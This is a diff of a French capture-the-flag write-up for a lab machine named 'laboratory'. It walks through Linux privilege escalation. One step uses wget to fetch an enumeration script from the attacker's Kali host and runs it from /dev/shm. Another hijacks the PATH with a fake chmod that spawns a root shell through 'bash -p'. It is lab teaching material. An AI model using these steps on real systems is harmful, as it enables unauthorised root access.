@@ -1,4 +1,5 @@
 ---
+
 # === Archetype writeups – v1 (stable) ===
 # === Archetype: writeups (Page Bundle) ===
 # Copié vers content/writeups/<nom_ctf>/index.md
@@ -880,21 +881,65 @@ dexter@laboratory:~$ pwd
 
 Tu confirmes ainsi que tu disposes d’un accès utilisateur classique sur la machine Linux `laboratory`.
 
+### Recherche de capabilities
+
+Tu vérifies si certains exécutables disposent de capabilities Linux particulières :
+
+```bash
+dexter@laboratory:~$ getcap -r / 2>/dev/null
+```
+
+Résultats :
+
+```bash
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+
+
+Les résultats affichés correspondent à des binaires système classiques. Ils ne donnent pas ici de piste directe d’escalade de privilèges.
+
+Tu poursuis donc l’énumération locale avec la recherche des binaires SUID.
+
 ### Recherche de binaires SUID
 
-Tu recherches ensuite les binaires SUID présents sur le système :
+Tu recherches ensuite les binaires SUID présents sur le système. Pour rendre la sortie plus lisible, tu utilises `suid3num.py`, qui classe les résultats et met en évidence les binaires personnalisés intéressants.
+
+Depuis Kali, tu vas dans le répertoire où se trouve `suid3num.py`, puis tu l’exposes avec un serveur HTTP simple :
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+python3 -m http.server 8000
 ```
 
-Parmi les binaires système classiques, un fichier personnalisé attire l’attention :
+Sur la machine cible, tu télécharges ensuite le script dans `/dev/shm` :
 
 ```bash
+cd /dev/shm
+
+wget http://10.10.x.x:8000/suid3num.py
+```
+
+Puis tu l’exécutes :
+
+```bash
+python3 suid3num.py
+```
+
+Dans les résultats, une section attire particulièrement l’attention :
+
+```txt
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
 /usr/local/bin/docker-security
+------------------------------
 ```
 
-La présence d’un binaire personnalisé avec le bit SUID mérite une analyse manuelle, car son comportement peut dépendre de commandes externes appelées pendant son exécution.
+Le script identifie donc `/usr/local/bin/docker-security` comme un binaire SUID personnalisé. Ce type de fichier mérite une analyse manuelle, car son comportement peut dépendre de commandes externes appelées pendant son exécution.
+
+
 
 ### Exploration de /usr/local/bin/docker-security
 
@@ -931,10 +976,12 @@ Il s’agit donc d’un binaire ELF 64 bits, dynamique, avec le bit SUID. À ce 
 Tu passes donc à une analyse dynamique avec `strace`. Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
 
 ```bash
-strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security
+strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security 2>/dev/null
 ```
 
 L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. L’option `-o` permet d’écrire la trace dans un fichier, ce qui rend l’analyse plus simple.
+
+La redirection `2>/dev/null` masque les messages d’erreur affichés pendant l’exécution et permet de garder la sortie lisible.
 
 Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
 
@@ -978,8 +1025,7 @@ Cette résolution via le `PATH` est la faiblesse exploitable. Comme `docker-secu
 Tu crées d’abord un faux exécutable `chmod` dans `/tmp` :
 
 ```bash
-cd /tmp
-cat > chmod << 'EOF'
+cat > /tmp/chmod << 'EOF'
 #!/bin/bash
 /bin/bash -p
 EOF
@@ -1024,7 +1070,7 @@ Comme `/tmp` est placé avant les répertoires système dans le `PATH`, l’appe
 Tu obtiens alors un shell Bash :
 
 ```bash
-bash-5.0$
+root@laboratory:~#
 ```
 
 Tu vérifies les privilèges effectifs du shell :
@@ -1036,10 +1082,10 @@ id
 Résultat :
 
 ```bash
-uid=1000(dexter) gid=1000(dexter) euid=0(root) groups=1000(dexter)
+uid=0(root) gid=0(root) groups=0(root),1000(dexter)
 ```
 
-La présence de `euid=0(root)` indique que le shell dispose des privilèges effectifs de `root`.
+Le shell s’exécute donc directement avec les privilèges de `root`.
 
 ### root.txt
 
@@ -1047,15 +1093,10 @@ Tu peux maintenant lire le flag final :
 
 ```bash
 cat /root/root.txt
+1126xxxxxxxxxxxxxxxxxxxxxxxxxxxad07
 ```
 
-Résultat :
-
-```bash
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-```
-
-La lecture de `root.txt` confirme que l’escalade de privilèges est terminée.
+La lecture de `root.txt` confirme que tu as pris le contrôle complet de la machine avec les privilèges `root`. Cette étape termine l’escalade de privilèges et marque la fin du challenge CTF.
 
 ---
 
